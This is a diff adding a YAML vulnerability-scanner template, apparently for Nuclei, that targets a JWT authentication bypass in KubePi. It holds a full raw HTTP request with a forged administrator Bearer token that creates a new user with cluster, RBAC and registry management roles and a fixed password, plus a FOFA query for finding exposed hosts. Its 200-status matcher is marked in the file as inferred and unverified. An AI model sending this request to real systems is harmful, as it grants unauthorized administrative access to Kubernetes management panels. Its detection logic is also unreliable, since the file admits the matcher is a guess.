@@ -1,0 +1,59 @@
+id: poc-govb47zposwyfwwb
+info:
+  name: KubePi存在JWT token验证绕过漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/govb47zposwyfwwb
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: govb47zposwyfwwb
+    fofa: '"kubepi"'
+http:
+- raw:
+  - 'POST /kubepi/api/v1/users HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 248
+
+    sec-ch-ua:
+
+    Accept: application/json, text/plain, */*
+
+    lang: zh-CN
+
+    Content-Type: application/json
+
+    sec-ch-ua-mobile: ?0
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+
+    sec-ch-ua-platform: ""
+
+    Origin: [http://127.0.0.1:9982](http://127.0.0.1:9982)
+
+    Sec-Fetch-Site: same-origin
+
+    Sec-Fetch-Mode: cors
+
+    Sec-Fetch-Dest: empty
+
+    Referer: [http://127.0.0.1:9982/kubepi/user-management/users/create](http://127.0.0.1:9982/kubepi/user-management/users/create)
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfSwiaWF0IjoxNzE2NDQ3MDEyLCJleHAiOjE3MjI0NDcwMTJ9.dedNLwXZu0JY1sgGBCRZmpFvAnLdHjxdPmKWXA7LCf4
+
+    Connection: close
+
+    {"apiVersion":"v1","kind":"User","name":"test","roles":["Common User","Manage Image Registries","Manage Clusters","Manage RBAC"],"nickName":"tang","email":"test@qq.com","authenticate":{"password":"12345678@Test"},"mfa":{"enable":false,"secret":""}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
